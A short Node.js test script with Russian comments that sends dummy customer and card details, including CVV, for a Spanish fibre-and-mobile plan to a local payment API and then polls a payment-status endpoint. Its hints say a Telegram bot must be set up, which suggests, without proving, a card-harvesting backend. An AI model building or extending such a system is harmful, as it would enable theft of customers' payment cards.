// Тестовый файл для проверки API оплаты
// Запустите: node test-payment-api.js

const testPaymentData = {
  firstName: "Juan",
  lastName: "Pérez",
  email: "juan.perez@test.com",
  phone: "+34 600 123 456",
  cardNumber: "1234 5678 9012 3456",
  expiryMonth: "12",
  expiryYear: "25",
  cvv: "123",
  period: "1",
  cart: {
    name: "Fibra 600 Mb + 35 GB",
    price: "47,00",
    description: "Fibra 600 Mb + fijo + Móvil con 35 GB y llamadas infinitas"
  },
  sessionId: "test-" + Date.now()
};

async function testPaymentAPI() {
  console.log('=== ТЕСТ API ОПЛАТЫ ===');
  console.log('Данные для теста:', JSON.stringify(testPaymentData, null, 2));
  console.log('');

  try {
    // Тестируем отправку данных
    console.log('1. Отправка данных в API...');
    const response = await fetch('http://localhost:3000/api/send-payment', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(testPaymentData),
    });

    const result = await response.json();
    console.log('Статус ответа:', response.status);
    console.log('Ответ:', result);
    console.log('');

    if (response.ok) {
      console.log('✅ API работает корректно');
      
      // Тестируем проверку статуса
      console.log('2. Проверка статуса платежа...');
      const statusResponse = await fetch(`http://localhost:3000/api/payment-status-vercel?sessionId=${testPaymentData.sessionId}`);
      const statusResult = await statusResponse.json();
      console.log('Статус платежа:', statusResult);
    } else {
      console.log('❌ Ошибка API:', result);
    }

  } catch (error) {
    console.log('❌ Ошибка подключения:', error.message);
    console.log('');
    console.log('Убедитесь что:');
    console.log('1. Сервер запущен на http://localhost:3000');
    console.log('2. Переменные окружения настроены (.env.local)');
    console.log('3. Telegram бот настроен');
  }

  console.log('=== ТЕСТ ЗАВЕРШЕН ===');
}

testPaymentAPI(); 